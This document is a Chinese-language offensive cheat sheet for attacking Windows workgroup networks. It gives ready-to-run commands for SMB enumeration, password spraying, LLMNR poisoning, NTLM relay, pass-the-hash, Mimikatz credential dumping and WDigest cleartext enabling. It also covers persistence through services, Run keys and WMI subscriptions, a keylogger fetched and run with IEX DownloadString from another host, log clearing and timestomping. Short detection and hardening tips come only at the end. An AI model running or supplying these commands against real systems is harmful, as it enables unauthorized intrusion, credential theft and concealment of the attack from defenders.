# 工作组攻击利用


## 1. 信息收集阶段

### 1.1 网络发现与扫描

**bash**

```
# 使用nmap进行网络扫描
nmap -sn 192.168.1.0/24                    # 主机发现
nmap -sS -sU -p 137,139,445 192.168.1.0/24 # SMB端口扫描
nmap --script smb-os-discovery 192.168.1.100

# NetBIOS名称解析
nbtscan 192.168.1.0/24
nmblookup -A 192.168.1.100
```

### 1.2 共享资源枚举

**bash**

```
# 枚举网络共享
smbclient -L //192.168.1.100 -N          # 匿名枚举
smbmap -H 192.168.1.100                   # 共享映射
enum4linux -a 192.168.1.100               # 全面枚举

# 查看可访问共享
net view \\192.168.1.100
```

## 2. 初始访问攻击

### 2.1 凭证攻击

**bash**

```
# 密码喷洒攻击
crackmapexec smb 192.168.1.0/24 -u userlist.txt -p 'Company123!' --no-bruteforce

# 暴力破解
hydra -L users.txt -P passwords.txt smb://192.168.1.100
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M smbnt

# 哈希传递检测
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 2.2 协议级攻击

#### LLMNR/NBNS毒化

**bash**

```
# 使用Responder进行毒化攻击
responder -I eth0 -wrf

# 自定义Responder配置
responder -I eth0 --lm -v -P  --disable-ess
```

#### SMB Relay攻击

**bash**

```
# 中继攻击设置
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -socks -smb2support

# 配合Responder（禁用SMB/HTTP）
responder -I eth0 --disable-ess
```

## 3. 横向移动技术

### 3.1 Pass The Hash (PTH)

**bash**

```
# 使用多种工具进行PTH
pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c //192.168.1.100 cmd

# Impacket套件
psexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c -x whoami
```

### 3.2 令牌窃取与模拟

**powershell**

```
# 使用Mimikatz进行令牌操作
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # token::revert
mimikatz # token::list

# 使用Incognito（Metasploit）
use incognito
list_tokens -u
impersonate_token "DOMAIN\\Administrator"
```

### 3.3 WMI执行

**bash**

```
# WMI远程命令执行
wmiexec.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

# 使用wmic
wmic /node:192.168.1.100 /user:administrator /password:Passw0rd process call create "cmd.exe /c whoami > C:\\output.txt"
```

### 3.4 计划任务利用

**powershell**

```
# 创建远程计划任务
schtasks /create /s 192.168.1.100 /u administrator /p Passw0rd /tn "Update" /tr "C:\\shell.exe" /sc once /st 00:00
schtasks /run /s 192.168.1.100 /u administrator /p Passw0rd /tn "Update"

# 使用Impacket的atexec
atexec.py administrator:Passw0rd@192.168.1.100 "whoami"
```

## 4. 权限提升技术

### 4.1 本地权限提升

**powershell**

```
# 使用PowerUp进行本地提权检查
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/PowerUp.ps1')
Invoke-AllChecks

# 常见提权向量检查
# - 服务权限配置错误
# - 未引用的服务路径
# - 计划任务权限
# - AlwaysInstallElevated
# - 可写注册表路径
```

### 4.2 凭据转储

**bash**

```
# 使用Mimikatz转储凭据
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
mimikatz # lsadump::secrets

# 使用Impacket转储SAM
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
secretsdump.py administrator@192.168.1.100 -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

### 4.3 注册表操作

**powershell**

```
# 转储SAM数据库
reg save hklm\sam C:\sam.save
reg save hklm\system C:\system.save
reg save hklm\security C:\security.save

# 启用WDigest（使密码在内存中明文存储）
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 1 /f
```

## 5. 持久化技术

### 5.1 服务创建

**powershell**

```
# 创建持久化服务
sc \\192.168.1.100 create "WindowsUpdate" binPath= "C:\shell.exe" start= auto
sc \\192.168.1.100 start "WindowsUpdate"

# PowerShell持久化
New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\shell.exe"
```

### 5.2 WMI事件订阅

**powershell**

```
# 创建WMI事件持久化
$FilterArgs = @{name='WindowsUpdate'; EventNameSpace='root\cimv2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"}
$Filter=Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $FilterArgs

$ConsumerArgs = @{name='WindowsUpdate'; CommandLineTemplate="C:\shell.exe"}
$Consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $ConsumerArgs

$BindingArgs = @{Filter=$Filter; Consumer=$Consumer}
$Binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $BindingArgs
```

### 5.3 计划任务持久化

**powershell**

```
# 创建隐藏的计划任务
schtasks /create /tn "Microsoft\Windows\WindowsUpdate" /tr "C:\shell.exe" /sc minute /mo 1 /f
```

## 6. 数据窃取与后渗透

### 6.1 敏感文件搜索

**powershell**

```
# 搜索敏感文件
Get-ChildItem C:\ -Include *.pdf,*.doc,*.docx,*.xls,*.xlsx,*.txt,*.kdbx -Recurse -ErrorAction SilentlyContinue

# 搜索配置文件中的密码
findstr /si password *.xml *.ini *.config *.txt
```

### 6.2 共享资源利用

**bash**

```
# 连接到共享并上传/下载文件
smbclient //192.168.1.100/Data -U administrator%Passw0rd
smb: \> put shell.exe
smb: \> get important.docx
```

### 6.3 键盘记录与屏幕捕获

**powershell**

```
# 使用PowerShell进行键盘记录
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/Get-Keystrokes.ps1')
Get-Keystrokes -LogPath C:\Windows\Temp\keylog.txt
```

## 7. 防御规避技术

### 7.1 日志清除

**powershell**

```
# 清除事件日志
wevtutil el | Foreach-Object {wevtutil cl "$_"}

# 清除PowerShell历史
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
```

### 7.2 文件隐藏与时间戳修改

**powershell**

```
# 修改文件时间戳
(Get-Item "C:\shell.exe").CreationTime = (Get-Date).AddDays(-30)
(Get-Item "C:\shell.exe").LastWriteTime = (Get-Date).AddDays(-30)
(Get-Item "C:\shell.exe").LastAccessTime = (Get-Date).AddDays(-30)

# 隐藏文件
attrib +h +s "C:\shell.exe"
```

## 8. 检测与防御措施

### 8.1 攻击检测

**powershell**

```
# 监控可疑活动
# - 异常SMB连接
# - 大量失败登录尝试
# - LLMNR/NBNS异常流量
# - 计划任务/服务创建
# - WMI事件订阅

# PowerShell日志分析
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} | 
    Where-Object {$_.Message -like "*Invoke-Expression*"}
```

### 8.2 防御加固

**powershell**

```
# 禁用有风险的协议
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" -Name "SMBDeviceEnabled" -Value 0
Disable-NetAdapterBinding -Name "*" -ComponentID "ms_llmnr"

# 启用SMB签名
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1

# 配置强密码策略
net accounts /minpwlen:12 /maxpwage:60
```

### 8.3 网络分段与监控

**bash**

```
# 实施网络分段
# - 将敏感系统隔离
# - 限制SMB流量
# - 监控横向移动

# 部署IDS/IPS规则
# - 检测PTH活动
# - 监控异常WMI调用
# - 检测计划任务创建
```

## 9. 工具与资源

### 9.1 常用工具列表

* **信息收集** : nmap, nbtscan, enum4linux
* **攻击利用** : Responder, Impacket, CrackMapExec
* **凭据操作** : Mimikatz, pth-toolkit
* **横向移动** : PsExec, WMI, PowerShell Remoting
* **持久化** : Metasploit, Empire, Cobalt Strike

### 9.2 缓解策略

1. **最小权限原则** ：限制本地管理员权限
2. **网络分段** ：隔离关键系统
3. **监控告警** ：实时检测攻击活动
4. **补丁管理** ：及时修复系统漏洞
5. **安全意识** ：培训员工识别社会工程攻击
